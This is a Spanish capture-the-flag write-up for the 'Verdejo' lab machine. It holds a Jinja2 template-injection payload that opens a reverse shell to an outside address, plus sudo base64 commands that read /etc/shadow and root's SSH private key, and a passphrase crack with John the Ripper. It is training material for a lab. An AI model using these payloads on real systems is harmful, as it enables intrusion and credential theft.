---
description: >-
  ✍️ Autor: The Hacker Labs🔍 Dificultad: Fácil  📅 Fecha de creación:
  22/05/2024
---

# Verdejo

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (835).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** y el **puerto 8089** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80,8089 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (837).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web sea la de por defecto de **Apache**.

<figure><img src="../../.gitbook/assets/image (836).png" alt=""><figcaption></figcaption></figure>

Vemos a ver que corre por el **puerto 8089**.

<figure><img src="../../.gitbook/assets/image (838).png" alt=""><figcaption></figcaption></figure>

Si enviamos el texto nos sale esto.

<figure><img src="../../.gitbook/assets/image (839).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Comenzamos verificando si es posible ejecutar un ataque XSS.

```bash
<script>alert("hacked")</script>
```

<figure><img src="../../.gitbook/assets/image (840).png" alt=""><figcaption></figcaption></figure>

Probamos si es propenso a un SSTI por lo que realizamos una operación matemática que deberá mostrar el resultado.

```
{{7*7}}
```

<figure><img src="../../.gitbook/assets/image (841).png" alt=""><figcaption></figcaption></figure>

Por lo que aprovechamos eso para enviarnos una Reverse Shell.

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c \'bash -i >& /dev/tcp/192.168.255.136/443 0>&1\'').read() }}
```

Nos ponemos en escucha.

```bash
nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (842).png" alt=""><figcaption></figcaption></figure>

Hacemos el [tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/) para trabajar más cómodos.

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (843).png" alt=""><figcaption></figcaption></figure>

Tenemos permisos **SUDO** con **base64** por lo que revisamos esta [página ](https://gtfobins.github.io/gtfobins/base64/)para escalar privilegios.

```bash
sudo base64 /etc/shadow | base64 --decode
```

<figure><img src="../../.gitbook/assets/image (844).png" alt=""><figcaption></figcaption></figure>

Durante el escaneo, notamos que el puerto SSH estaba abierto. Esto sugiere la posibilidad de que el usuario root tenga un archivo `id_rsa`. Al intentar leer este archivo utilizando la ruta predeterminada, confirmamos que efectivamente obtuvimos el `id_rsa`.

```bash
sudo base64 /root/.ssh/id_rsa | base64 --decode
```

<figure><img src="../../.gitbook/assets/image (846).png" alt=""><figcaption></figcaption></figure>

Transferimos el archivo a nuestra máquina local y, tras asignarle permisos de ejecución, intentamos establecer la conexión. Sin embargo, se nos solicitó la contraseña asociada al `id_rsa`.

```bash
chmod 600 id_rsa
```

<figure><img src="../../.gitbook/assets/image (847).png" alt=""><figcaption></figcaption></figure>

En este paso, utilizamos **ssh2john** para extraer el hash del archivo. Posteriormente, empleamos **John the Ripper** para descifrar la contraseña, siempre que esta se encuentre en nuestro diccionario. Después de un tiempo, logramos identificar la clave

```bash
ssh2john id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (849).png" alt=""><figcaption></figcaption></figure>

Nos logueamos y metemos las credenciales. Ya somos **root**.

<figure><img src="../../.gitbook/assets/image (850).png" alt=""><figcaption></figcaption></figure>
